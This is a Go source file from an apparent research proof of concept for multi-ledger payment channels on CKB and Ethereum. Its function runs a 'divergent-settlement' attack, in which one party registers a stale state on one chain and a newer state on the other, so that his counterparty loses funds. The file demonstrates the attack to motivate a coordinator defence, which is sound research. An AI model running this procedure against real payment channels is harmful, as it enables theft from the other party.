// Copyright 2026 - See NOTICE file for copyright holders.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"fmt"
	"log"
	"time"

	"perun.network/go-perun/channel"

	"perun-multiledger-poc/multiledger-ckb-eth/client"
)

// runAttack performs the divergent-settlement attack on the multi-ledger payment
// channel WITHOUT a coordinator (POC §2; thesis Sc 1). Through an agreed
// cross-asset swap Bob legitimately co-signs two later states: vCkb (after Alice
// has paid him on ETH but before he pays her on CKB, so he still holds his full
// CKB) and vEth (after he has also paid her on CKB). He registers the stale vCkb
// on CKB and the newer vEth on ETH for the SAME channel, so each ledger settles a
// different version. Bob banks his best share on each chain; Alice — who agreed to
// the swap — loses the CKB Bob owed her without keeping the ETH she paid. The
// parent-only coordinator (coordinated mode) prevents this.
//
// The two registered states are deliberately non-zero versions: the CKB
// adjudicator only opens a dispute for a post-funding state (registering the v0
// funding state leaves the cell un-disputed → force-close fails StatusNotDisputed).
func runAttack(m *meters, bob, alice *Participant, chBA, chAB *client.PaymentChannel) {
	ctx := context.Background()

	// Agreed cross-asset swap, ETH leg first: Alice pays Bob on ETH (Bob keeps his
	// full CKB at this point) — this is Bob's CKB-favoured state, a non-zero version.
	log.Println("[attack] swap leg 1: Alice pays Bob on ETH.")
	chAB.SendEthPayment(parentEth / 2)
	reqBobCkb := adjReqSnapshot(chBA)
	reqAliceCkb := adjReqSnapshot(chAB)
	log.Printf("[attack] captured vCkb (v%d) — Bob's CKB-favoured state.", reqBobCkb.Tx.State.Version)

	// Swap leg 2: Bob pays Alice on CKB — Bob's ETH-favoured state (he keeps the ETH
	// Alice paid and has now spent his CKB).
	log.Println("[attack] swap leg 2: Bob pays Alice on CKB.")
	chBA.SendCKBPayment(int64(parentCkb / 2))
	reqBobEth := adjReqSnapshot(chBA)
	reqAliceEth := adjReqSnapshot(chAB)
	log.Printf("[attack] captured vEth (v%d) — Bob's ETH-favoured state.", reqBobEth.Tx.State.Version)

	// Alice only collects her share, so she withdraws as secondary. On CKB the
	// conclude pays both parties from the single channel cell (her withdraw is a
	// no-op); on ETH the secondary still pulls her own allocation.
	reqAliceCkb.Secondary = true
	reqAliceEth.Secondary = true

	emptyMap := channel.MakeStateMap()
	m.version("register_ckb", uint64(reqBobCkb.Tx.State.Version))
	m.version("register_eth", uint64(reqBobEth.Tx.State.Version))
	start := time.Now()

	// Step 1: CKB — register the stale vCkb (Bob's CKB-favoured version), then wait
	// out CKB's dispute window in wall-clock time.
	log.Printf("[attack] [+%5.1fs] step 1: register the channel on CKB at the stale vCkb (v%d).",
		time.Since(start).Seconds(), reqBobCkb.Tx.State.Version)
	if err := m.ckbOp("register_ckb", func() error { return bob.CkbAdj.Register(ctx, reqBobCkb, nil) }); err != nil {
		log.Fatalf("[attack] CKB register: %v", err)
	}
	waitChallenge("attack", start, attackChallenge, "CKB")

	// Step 2: ETH — register the SAME channel at the newer vEth (Bob's ETH-favoured
	// version), then wait out ETH's window.
	log.Printf("[attack] [+%5.1fs] step 2: register the channel on ETH at the newer vEth (v%d).",
		time.Since(start).Seconds(), reqBobEth.Tx.State.Version)
	if err := m.ethOp("register_eth", func() error { return bob.EthAdj.Register(ctx, reqBobEth, nil) }); err != nil {
		log.Fatalf("[attack] ETH register: %v", err)
	}
	waitChallenge("attack", start, attackChallenge, "ETH")

	// Step 3: each ledger pays out the version it locally registered — CKB at vCkb,
	// ETH at vEth.
	log.Println("[attack] both dispute windows elapsed — withdrawing divergently.")
	if err := m.ckbOp("conclude_ckb", func() error { return bob.CkbAdj.Withdraw(ctx, reqBobCkb, emptyMap) }); err != nil {
		log.Fatalf("[attack] Bob CKB withdraw: %v", err)
	}
	if err := alice.CkbAdj.Withdraw(ctx, reqAliceCkb, emptyMap); err != nil {
		log.Fatalf("[attack] Alice CKB withdraw: %v", err)
	}
	if err := m.ethOp("conclude_eth", func() error { return bob.EthAdj.Withdraw(ctx, reqBobEth, emptyMap) }); err != nil {
		log.Fatalf("[attack] Bob ETH withdraw: %v", err)
	}
	if err := alice.EthAdj.Withdraw(ctx, reqAliceEth, emptyMap); err != nil {
		log.Fatalf("[attack] Alice ETH withdraw: %v", err)
	}
	m.version("conclude_ckb", uint64(reqBobCkb.Tx.State.Version))
	m.version("conclude_eth", uint64(reqBobEth.Tx.State.Version))

	fmt.Println()
	fmt.Println("============================================================")
	fmt.Println("  DIVERGENT-SETTLEMENT ATTACK (no coordinator) — OUTCOME")
	fmt.Println("============================================================")
	fmt.Printf("  CKB settled the channel at v%d (Bob keeps his full CKB)\n", reqBobCkb.Tx.State.Version)
	fmt.Printf("  ETH settled the channel at v%d (Bob keeps the ETH Alice paid)\n", reqBobEth.Tx.State.Version)
	fmt.Println("  Result: ATTACK SUCCEEDED — the channel settled at a different")
	fmt.Println("  version on each ledger (divergent settlement). I1 and I2 are")
	fmt.Println("  violated: the two ledgers released funds under different states,")
	fmt.Println("  with no coordinate() gate between register and conclude.")
	fmt.Println("============================================================")
}
